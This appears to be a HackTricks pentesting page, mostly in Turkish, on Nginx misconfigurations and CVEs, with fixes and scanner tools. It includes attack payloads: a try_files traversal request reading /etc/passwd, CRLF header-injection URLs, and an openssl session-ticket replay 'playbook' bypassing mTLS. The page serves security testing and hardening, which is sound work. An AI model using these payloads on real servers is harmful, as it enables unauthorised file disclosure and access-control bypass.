# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Missing root location <a href="#missing-root-location" id="missing-root-location"></a>

Nginx sunucusunu yapılandırırken, **root directive** dosyaların servis edildiği temel dizini tanımlayarak kritik bir rol oynar. Aşağıdaki örneği inceleyin:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Bu yapılandırmada `/etc/nginx` root dizini olarak atanmıştır. Bu yapı, belirtilen root dizini içindeki `/hello.txt` gibi dosyalara erişime izin verir. Ancak yalnızca belirli bir location (`/hello.txt`) tanımlandığını not etmek önemlidir. Root location için (`location / {...}`) bir yapılandırma yoktur. Bu eksiklik, root direktifinin global olarak uygulanması anlamına gelir; bu da kök yol `/` için yapılan isteklerin `/etc/nginx` altındaki dosyalara erişmesine olanak tanır.

Bu yapılandırmadan önemli bir güvenlik riski doğar. `GET /nginx.conf` gibi basit bir `GET` isteği, `/etc/nginx/nginx.conf` konumundaki Nginx yapılandırma dosyasını sunarak hassas bilgileri açığa çıkarabilir. Root'u `/etc` gibi daha az hassas bir dizine ayarlamak bu riski azaltabilir, ancak yine de diğer yapılandırma dosyalarına, erişim loglarına ve HTTP basic authentication için kullanılan şifrelenmiş kimlik bilgilerine istemeden erişime izin verebilir.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nginx yapılandırma dosyalarında "location" direktiflerinin yakından incelenmesi gerekir. Local File Inclusion (LFI) olarak bilinen bir zafiyet, aşağıdakine benzer bir yapılandırma yoluyla istemeden sisteme girebilir:
```
location /imgs {
alias /path/images/;
}
```
Bu yapılandırma, sunucunun `/imgs../flag.txt` gibi istekleri amaçlanan dizinin dışındaki dosyalara erişim girişimi olarak yorumlaması nedeniyle LFI saldırılarına açıktır; bu istek aslında `/path/images/../flag.txt` olarak çözülür. Bu zafiyet, saldırganların web üzerinden erişilebilir olmaması gereken sunucu dosyalarını elde etmelerine olanak tanır.

Bu açığı hafifletmek için yapılandırma şu şekilde düzeltilmelidir:
```
location /imgs/ {
alias /path/images/;
}
```
Daha fazla bilgi: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix testleri:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Güvensiz path kısıtlaması <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Aşağıdaki sayfaya bakın; bu tür direktifleri nasıl bypass edeceğinizi öğrenin:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Güvensiz değişken kullanımı / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Zafiyetli değişkenler `$uri` ve `$document_ur`i olup bu, bunların `$request_uri` ile değiştirilmesiyle düzeltilebilir.
>
> Bir regex de şu şekilde zafiyetli olabilir:
>
> `location ~ /docs/([^/])? { … $1 … }` - Zafiyetli
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Zafiyetli değil (boşluk kontrolü)
>
> `location ~ /docs/(.*)? { … $1 … }` - Zafiyetli değil

Aşağıdaki örnek bir Nginx konfigürasyonundaki zafiyeti göstermektedir:
```
location / {
return 302 https://example.com$uri;
}
```
HTTP isteklerinde yeni satır karakterlerini belirtmek için \r (Carriage Return) ve \n (Line Feed) karakterleri kullanılır ve bunların URL-encoded biçimleri `%0d%0a` şeklindedir. Bu karakterleri bir isteğe dahil etmek (ör. `http://localhost/%0d%0aDetectify:%20clrf`) yanlış yapılandırılmış bir sunucuya gönderildiğinde, sunucu yanıtında yeni bir `Detectify` başlığı oluşturur. Bu, $uri değişkeninin URL-encoded yeni satır karakterlerini decode etmesi nedeniyle olur ve yanıtta beklenmeyen bir başlığa yol açar:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection ve response splitting riskleri hakkında daha fazla bilgi için: [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Ayrıca bu teknik, bazı savunmasız örnekler ve tespit mekanizmalarıyla [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77).

For example, In order to detect this misconfiguration from a blackbox perspective you could these requests:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

If vulnerable, the first will return as "X" is any HTTP method and the second will return an error as H is not a valid method. So the server will receive something like: `GET / H HTTP/1.1` and this will trigger the error.

Another detection examples would be:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Some found vulnerable configurations presented in that talk were:

- **`$uri`**'nin son URL'de olduğu gibi ayarlandığına dikkat edin
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Yine **`$uri`**'nin URL'de olduğunu unutmayın (bu sefer bir parametre içinde)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Şimdi AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Herhangi bir değişken

Belirlendi ki **kullanıcı tarafından sağlanan veriler** belirli durumlarda bir **Nginx değişkeni** olarak işlenebilir. Bu davranışın nedeni tam olarak net değil; yine de nadir değil ve doğrulaması basit değil. Bu anomali HackerOne'daki bir güvenlik raporunda vurgulandı ve rapor [here](https://hackerone.com/reports/370094) üzerinden görüntülenebilir. Hata mesajının daha fazla incelenmesi, bunun [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) içinde gerçekleştiğini ortaya koydu ve Server Side Includes (SSI) kök neden olarak belirlendi.

Bu yanlış yapılandırmayı **tespit etmek** için aşağıdaki komut çalıştırılabilir; bu komut değişkenlerin yazdırılmasını test etmek için bir referer header ayarlamayı içerir:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Sistemler genelinde bu yanlış yapılandırma için yapılan taramalar, bir kullanıcının Nginx değişkenlerini yazdırabildiği birden fazla örnek ortaya çıkardı. Ancak, savunmasız örneklerin sayısındaki azalma, bu sorunu düzeltme çabalarının bir ölçüde başarılı olduğunu gösteriyor.

### try_files ile $URI$ARGS değişkenleri kullanımı

Aşağıdaki Nginx yanlış yapılandırması bir LFI zafiyetine yol açabilir:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Yapılandırmamızda, belirli bir sırayla dosyaların varlığını kontrol etmek için kullanılan `try_files` yönergesi var. Nginx, bulduğu ilk dosyayı sunacaktır. `try_files` yönergesinin temel sözdizimi şu şekildedir:
```
try_files file1 file2 ... fileN fallback;
```
Nginx, belirtilen sıraya göre her dosyanın varlığını kontrol eder. Bir dosya mevcutsa, hemen servis edilir. Belirtilen dosyalardan hiçbiri yoksa, istek başka bir URI veya belirli bir hata sayfası olabilen yedek seçeneğe iletilir.

Ancak, bu yönergede `$uri$args` değişkenlerini kullanırken, Nginx istek URI'si ile herhangi bir sorgu dizesi argümanının birleşimine uyan bir dosya aramaya çalışır. Dolayısıyla bu yapılandırmayı şu şekilde istismar edebiliriz:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Aşağıdaki payload ile:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Payload'ımızı kullanarak Nginx konfigürasyonunda tanımlı root dizininden kaçıp `/etc/passwd` dosyasını yükleyeceğiz. Debug loglarında Nginx'in dosyaları nasıl denediğini gözlemleyebiliriz:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
Yukarıda belirtilen konfigürasyon kullanılarak Nginx'e karşı PoC:
![Example burp request](../../images/nginx_try_files.png)

## Raw backend response okuma

Nginx, `proxy_pass` aracılığıyla backend tarafından üretilen hataları ve HTTP başlıklarını yakalayarak dahili hata mesajlarını ve başlıkları gizlemeyi sağlayan bir özellik sunar. Bu, Nginx'in backend hatalarına karşılık özel hata sayfaları sunmasıyla gerçekleştirilir. Ancak Nginx geçersiz bir HTTP isteği ile karşılaştığında sorunlar ortaya çıkar. Böyle bir istek olduğu gibi backend'e iletilir ve backend'in raw response'u Nginx müdahalesi olmadan doğrudan client'e gönderilir.

Bir uWSGI uygulamasını içeren örnek bir senaryoyu ele alalım:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Bunu yönetmek için, Nginx yapılandırmasında belirli direktifler kullanılır:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Bu direktif, durum kodu 300'den büyük olan backend yanıtları için Nginx'in özel bir yanıt sunmasını sağlar. Örneğin uWSGI uygulamamızda bir `500 Error` yanıtının Nginx tarafından yakalanıp işlenmesini garanti eder.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): İsminin de belirttiği gibi, bu direktif belirtilen HTTP başlıklarını istemciden gizleyerek gizliliği ve güvenliği artırır.

Geçerli bir `GET` isteği yapıldığında, Nginx isteği normal şekilde işler ve herhangi bir gizli başlığı ifşa etmeden standart bir hata yanıtı döner. Ancak, geçersiz bir HTTP isteği bu mekanizmayı atlayarak ham backend yanıtlarının — gizli başlıklar ve hata mesajları dahil — açığa çıkmasına neden olur.

## merge_slashes kapalı olarak ayarlandı

Varsayılan olarak Nginx'in **`merge_slashes` directive'i** **`on`** olarak ayarlanmıştır; bu, bir URL'deki birden fazla ileri eğik çizgiyi tek bir eğik çizgiye sıkıştırır. Bu özellik, URL işlemesini sadeleştirirken, özellikle Nginx ters proxy olarak davrandığında arkasındaki uygulamalardaki yerel dosya dahil etme (LFI) gibi zafiyetleri istemeden gizleyebilir. Güvenlik araştırmacıları **Danny Robinson and Rotem Bar** bu varsayılan davranışla ilişkili potansiyel riskleri vurgulamışlardır.

Böyle riskleri azaltmak için, bu tür zafiyetlere açık uygulamalar için **`merge_slashes` directive'ini kapatmak** önerilir. Bu, Nginx'in URL yapısını değiştirmeden istekleri uygulamaya iletmesini sağlar ve böylece altta yatan güvenlik sorunlarının maskelemesini engeller.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Yanıt Başlıkları**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), web sunucusundan gelen yanıtta mevcut olan bazı başlıklar Nginx proxy'nin davranışını değiştirebilir. Bunları [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) üzerinde kontrol edebilirsiniz:

- `X-Accel-Redirect`: İsteğin Nginx tarafından dahili olarak belirtilen bir konuma yönlendirilmesini belirtir.
- `X-Accel-Buffering`: Nginx'in yanıtı tamponlayıp tamponlamayacağını kontrol eder.
- `X-Accel-Charset`: X-Accel-Redirect kullanıldığında yanıt için karakter setini ayarlar.
- `X-Accel-Expires`: X-Accel-Redirect kullanıldığında yanıt için geçerlilik süresini ayarlar.
- `X-Accel-Limit-Rate`: X-Accel-Redirect kullanıldığında yanıtların transfer hızını sınırlar.

Örneğin, başlık **`X-Accel-Redirect`** nginx içinde dahili bir **redirect** oluşturur. Bu nedenle nginx yapılandırmasında **`root /`** gibi bir ayar ve web sunucusundan **`X-Accel-Redirect: .env`** içeren bir yanıt olması nginx'in **`/.env`** içeriğini göndermesine (Path Traversal) neden olur.

### **Map Direktifinde Varsayılan Değer**

Nginx yapılandırmasında `map` direktifi genellikle **yetkilendirme kontrolü** içinde rol oynar. Yaygın bir hata, bir **varsayılan** değer belirtmemektir; bu durum yetkisiz erişime yol açabilir. Örneğin:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Bir `default` olmadan, bir **kötü niyetli kullanıcı** `/map-poc` içindeki **tanımsız URI**'ye erişerek güvenliği atlatabilir. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) bu tür sorunları önlemek için bir **varsayılan değer** belirlemeyi önerir.

### **DNS Spoofing Vulnerability**

Belirli koşullar altında Nginx'e karşı DNS spoofing mümkündür. Bir saldırgan Nginx'in kullandığı **DNS server**'ı biliyorsa ve DNS sorgularını ele geçirebiliyorsa, DNS kayıtlarını spoof edebilir. Ancak Nginx DNS çözümlemesi için **localhost (127.0.0.1)** kullanacak şekilde yapılandırılmışsa bu yöntem etkisizdir. Nginx aşağıdaki şekilde bir DNS server belirtmeye izin verir:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` and `internal` Direktifleri**

The **`proxy_pass`** direktifi, istekleri dahili veya harici diğer sunuculara yönlendirmek için kullanılır. The **`internal`** direktifi belirli lokasyonların yalnızca Nginx içinde erişilebilir olmasını sağlar. While these directives are not vulnerabilities by themselves, their configuration requires careful examination to prevent security lapses.

## proxy_set_header Upgrade & Connection

Eğer nginx sunucusu Upgrade ve Connection header'larını iletecek şekilde yapılandırılmışsa, korumalı/dahili uç noktalara erişmek için bir [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) gerçekleştirilebilir.

> [!CAUTION]
> Bu zayıflık bir saldırganın **`proxy_pass` endpoint`i ile doğrudan bağlantı kurmasına** (`http://backend:9999` bu durumda) ve bu bağlantının içeriğinin nginx tarafından kontrol edilmeyeceği bir bağlantı sağlamasına izin verir.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Dikkat: `proxy_pass` belirli bir **path**'e işaret ediyor olsa bile, örneğin `http://backend:9999/socket.io`, bağlantı `http://backend:9999` ile kurulacaktır; bu yüzden o internal endpoint içinde **başka herhangi bir path ile iletişim kurabilirsiniz. Yani proxy_pass URL'sinde bir path belirtilmiş olması önemli değildir.**

## HTTP/3 QUIC module uzaktan DoS & leak (2024)

2024 boyunca Nginx, CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 ve CVE-2024-35200 bildirdi; bu durum, deneysel `ngx_http_v3_module` derlendiğinde ve bir `listen ... quic` soketi açığa çıktığında **single hostile QUIC session**'ın worker proseslerini çökertebileceğini veya belleği leak edebileceğini gösteriyor. Etkilenen sürümler 1.25.0–1.25.5 ve 1.26.0 iken düzeltmeler 1.27.0/1.26.1 ile gelmektedir; bellek açığa çıkması (CVE-2024-34161) hassas verilerin ortaya çıkması için ayrıca 4096 baytın üzerindeki MTU'ları gerektirmektedir (detaylar aşağıdaki 2024 nginx advisory'sinde).

**Recon & exploitation hints**

- HTTP/3 opt-in olduğu için `Alt-Svc: h3=":443"` yanıtlarını tarayın veya UDP/443 üzerindeki QUIC handshake'lerini brute-force edin; doğrulandıktan sonra worker çökmesini tetiklemek ve log leakage zorlamak için handshake ve STREAM framelerini custom `quiche-client`/`nghttp3` payload'ları ile fuzz edin.
- Hedef desteğini hızlıca fingerprint etmek için:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS oturum yeniden kullanımı ile client cert auth atlatma (CVE-2025-23419)

Şubat 2025'te yayımlanan bir advisory, OpenSSL ile derlenmiş nginx 1.11.4–1.27.3 sürümlerinin **bir name-based virtual host'tan** alınan TLS 1.3 oturumunu başka bir vhost içinde yeniden kullanmaya izin verdiğini açıkladı; böylece sertifika istemeyen bir host ile müzakere eden bir istemci, ticket/PSK'yi tekrar oynatarak `ssl_verify_client on;` ile korunan bir vhost'a atlayabilir ve mTLS'i tamamen atlayabilir. Hata, birden fazla virtual host aynı TLS 1.3 session cache ve tickets'i paylaştığında tetiklenir (aşağıda referans verilen 2025 nginx advisory'sine bakın).

**Saldırgan playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Hedef savunmasızsa, ikinci handshake istemci sertifikası sunulmadan tamamlanır ve korumalı konumlar ortaya çıkar.

**Ne denetlenmeli**

- Karma `server_name` blokları; aynı `ssl_session_cache shared:SSL` ile birlikte `ssl_session_tickets on;` kullanılması.
- mTLS bekleyen ancak ortak session cache/ticket ayarlarını public host'lardan devralan Admin/API blokları.
- vhost izolasyonunu dikkate almadan TLS 1.3 oturum yeniden kullanımı'nı küresel olarak etkinleştiren otomasyon (ör. Ansible roles).

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

HTTP/2 Rapid Reset attack (CVE-2023-44487) nginx'i, operatörler `keepalive_requests` veya `http2_max_concurrent_streams`'i varsayılanların ötesine çıkarınca hâlâ etkileyebilir: bir saldırgan bir HTTP/2 bağlantısı açar, onu binlerce stream ile doldurur, ardından eşzamanlılık tavanına hiç ulaşılmaması için hemen `RST_STREAM` frame'leri gönderir; bu sırada CPU sonlandırma mantığında meşgul olmaya devam eder. Nginx varsayılanları (128 concurrent streams, 1000 keepalive requests) etki çapını küçük tutar; bu limitleri "önemli ölçüde" yükseltmek, tek bir istemciden bile worker'ları kaynak yetersizliğine sürüklemeyi basit hale getirir (aşağıda bahsedilen F5 write-up'a bakın).

**Tespit ipuçları**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hostların bu direktifler için olağanüstü yüksek değerler açığa vurması onları birincil hedef haline getirir: tek bir HTTP/2 istemcisi, eşzamanlılık sınırına takılmadan CPU'yu yüksek tutmak için stream oluşturma ve anlık `RST_STREAM` frame'leri döngüsü kullanabilir.

## Kendiniz deneyin

Detectify, bu makalede tartışılan bazı yanlış yapılandırmalarla birlikte kendi savunmasız Nginx test sunucunuzu Docker kullanarak kurabileceğiniz ve bunları kendiniz bulmayı deneyebileceğiniz bir GitHub repository'si oluşturdu!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statik Analiz Araçları

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (an updated fork of GIXY) Nginx konfigürasyonlarını analiz etmek için kullanılan bir araçtır; amacı güvenlik açıklarını, güvensiz direktifleri ve riskli yanlış yapılandırmaları bulmaktır. Ayrıca performansı etkileyen yanlış yapılandırmaları tespit eder ve kaçırılmış hardening fırsatlarını ortaya çıkararak otomatik kusur tespiti sağlar.
- [gixy-ng](https://github.com/dvershinin/gixy) (the actively maintained fork of GIXY) Nginx konfigürasyonlarını analiz etmek için kullanılan bir araçtır; amacı güvenlik açıklarını, güvensiz direktifleri ve riskli yanlış yapılandırmaları bulmaktır. Ayrıca performansı etkileyen yanlış yapılandırmaları tespit eder ve kaçırılmış hardening fırsatlarını ortaya çıkararak otomatik kusur tespiti sağlar.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner, yaygın Nginx yanlış yapılandırmalarını ve güvenlik açıklarını aramak için basit bir araçtır.

## Kaynaklar

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
